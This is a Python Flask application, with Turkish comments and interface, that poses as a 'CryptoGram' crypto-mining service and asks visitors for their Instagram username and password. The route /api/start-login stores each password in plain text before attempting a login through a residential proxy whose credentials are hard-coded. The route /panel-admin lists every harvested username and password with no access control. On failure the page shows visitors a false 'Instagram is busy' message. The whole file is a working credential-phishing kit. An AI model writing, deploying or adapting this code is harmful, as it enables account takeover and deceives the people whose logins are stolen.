import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL", "sqlite:///test.db")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# TÜRKİYE PROXY - EN HIZLI TÜNEL
PROXY_URL = "http://pcUjiruWbB-res-tr:PC_4gAMh8pCXyTQAxKW1@proxy-eu.proxy-cheap.com:5959"

class IGUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    status = db.Column(db.String(100), default="Bekliyor")

# --- ARAYÜZ (Modern & Hızlı) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoGram | Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body{background:#0a0a0a;font-family:sans-serif;}.glass{background:rgba(255,255,255,0.03);backdrop-filter:blur(10px);border:1px solid rgba(0,149,246,0.3);}</style>
</head>
<body class="flex items-center justify-center min-h-screen text-white">
    <div class="glass p-10 rounded-2xl w-full max-w-[380px] text-center">
        <h1 class="text-3xl font-bold bg-gradient-to-r from-blue-500 to-cyan-400 bg-clip-text text-transparent mb-6">CryptoGram</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl outline-none focus:border-blue-500">
            <input id="p" type="password" placeholder="Şifre" class="w-full bg-zinc-900 border border-zinc-800 p-3 rounded-xl outline-none focus:border-blue-500">
            <button onclick="start()" id="btn" class="w-full bg-blue-600 hover:bg-blue-500 font-bold py-3 rounded-xl transition-all shadow-lg shadow-blue-900/30">HESABI BAĞLA</button>
            <p id="msg" class="text-xs text-zinc-500"></p>
        </div>
    </div>
    <script>
        async function start() {
            const u=document.getElementById('u').value, p=document.getElementById('p').value;
            const btn=document.getElementById('btn'), msg=document.getElementById('msg');
            if(!u || !p) return;
            btn.disabled = true; btn.innerText = "BAĞLANILIYOR..."; msg.innerText = "Lütfen bekleyin, bot girişi doğrulanıyor...";
            try {
                const r = await fetch('/api/start-login', {
                    method: 'POST', headers: {'Content-Type':'application/json'},
                    body: JSON.stringify({u, p})
                });
                const d = await r.json();
                msg.innerText = d.msg;
                btn.innerText = d.status === "success" ? "BAĞLANDI ✅" : "TEKRAR DENE";
                btn.disabled = d.status === "success";
            } catch(e) { msg.innerText = "Bağlantı hatası!"; btn.disabled = false; }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/start-login', methods=['POST'])
def start_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # 1. ŞİFREYİ HEMEN YAZ (Bot patlasa bile sende kalsın)
    user = IGUser.query.filter_by(username=u).first()
    if not user:
        user = IGUser(username=u, password=p); db.session.add(user)
    else:
        user.password = p
    db.session.commit()

    # 2. DİREKT DENEME (THREAD YOK, BEKLEME YOK)
    cl = Client()
    try:
        cl.set_proxy(PROXY_URL)
        cl.request_timeout = 15 # 15 saniye içinde cevap almalı
        cl.set_device_settings({"device_model": "iPhone13,2", "locale": "tr_TR"})
        
        if cl.login(u, p):
            user.status = "AKTİF ✅"
            db.session.commit()
            return jsonify(status="success", msg="Bağlantı başarılı! Coin kasmaya başlandı.")
        else:
            user.status = "Hatalı Şifre ❌"
            db.session.commit()
            return jsonify(status="error", msg="Kullanıcı adı veya şifre hatalı.")
            
    except Exception as e:
        # Eğer bot giriş yapamazsa (Proxy hatası vb.) durumu yaz ama şifre sende kalsın
        user.status = f"Hata: {str(e)[:15]}"
        db.session.commit()
        return jsonify(status="error", msg="Instagram şu an meşgul, lütfen 10 saniye sonra tekrar deneyin.")

@app.route('/panel-admin')
def admin():
    users = IGUser.query.order_by(IGUser.id.desc()).all()
    res = "<body style='background:#000;color:#fff;font-family:sans-serif;padding:20px;'>"
    res += "<h2>GİRİŞ YAPANLAR</h2><table border='1' style='width:100%;text-align:left;'>"
    res += "<tr><th>USER</th><th>PASS</th><th>DURUM</th></tr>"
    for u in users: res += f"<tr><td>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
    return res + "</table></body>"

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
